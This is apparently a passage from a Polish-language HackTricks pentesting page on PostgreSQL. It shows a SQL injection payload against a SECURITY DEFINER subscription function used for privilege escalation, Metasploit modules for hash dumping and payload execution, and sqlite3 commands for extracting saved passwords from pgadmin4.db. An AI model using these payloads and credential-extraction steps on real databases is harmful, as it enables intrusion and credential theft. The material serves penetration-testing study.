<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Jak [wyjaśniono w dokumentacji](https://www.postgresql.org/docs/current/sql-createfunction.html), funkcja z **SECURITY DEFINER jest wykonywana** z uprawnieniami **użytkownika, który ją posiada**. Dlatego, jeśli funkcja jest **podatna na SQL Injection** lub wykonuje **przywilejowane działania z parametrami kontrolowanymi przez atakującego**, może być wykorzystana do **podwyższenia uprawnień wewnątrz postgres**.

W linii 4 poprzedniego kodu można zobaczyć, że funkcja ma flagę **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
A następnie **wykonaj polecenia**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Przechodzenie siłowe z użyciem PL/pgSQL

**PL/pgSQL** to **w pełni funkcjonalny język programowania**, który oferuje większą kontrolę proceduralną w porównaniu do SQL. Umożliwia korzystanie z **pętli** i innych **struktur kontrolnych** w celu ulepszenia logiki programu. Ponadto, **polecenia SQL** i **wyzwalacze** mają możliwość wywoływania funkcji, które są tworzone przy użyciu języka **PL/pgSQL**. Ta integracja pozwala na bardziej wszechstronne i elastyczne podejście do programowania i automatyzacji bazy danych.\
**Możesz wykorzystać ten język, aby poprosić PostgreSQL o przeprowadzenie ataku siłowego na dane uwierzytelniające użytkowników.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logowanie

W pliku _**postgresql.conf**_ można włączyć logowanie postgresql, zmieniając:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Następnie, **zrestartuj usługę**.

### pgadmin

[pgadmin](https://www.pgadmin.org) to platforma do administracji i rozwoju PostgreSQL.\
Hasła można znaleźć w pliku _**pgadmin4.db**_.\
Można je odszyfrować za pomocą funkcji _**decrypt**_ w skrypcie: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Autoryzacja klienta w PostgreSQL jest zarządzana za pomocą pliku konfiguracyjnego o nazwie **pg_hba.conf**. Ten plik zawiera serię rekordów, z których każdy określa typ połączenia, zakres adresów IP klienta (jeśli dotyczy), nazwę bazy danych, nazwę użytkownika i metodę uwierzytelniania do użycia przy dopasowywaniu połączeń. Pierwszy rekord, który pasuje do typu połączenia, adresu klienta, żądanej bazy danych i nazwy użytkownika, jest używany do uwierzytelniania. Jeśli nie ma pasującego rekordu, dostęp jest odrzucany.

Dostępne metody uwierzytelniania oparte na haśle w pliku pg_hba.conf to **md5**, **crypt** i **password**. Metody te różnią się sposobem przesyłania hasła: skrótem MD5, zaszyfrowaniem kryptograficznym lub tekstem jawnym. Ważne jest zauważenie, że metoda crypt nie może być używana z hasłami, które zostały zaszyfrowane w pg_authid.

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
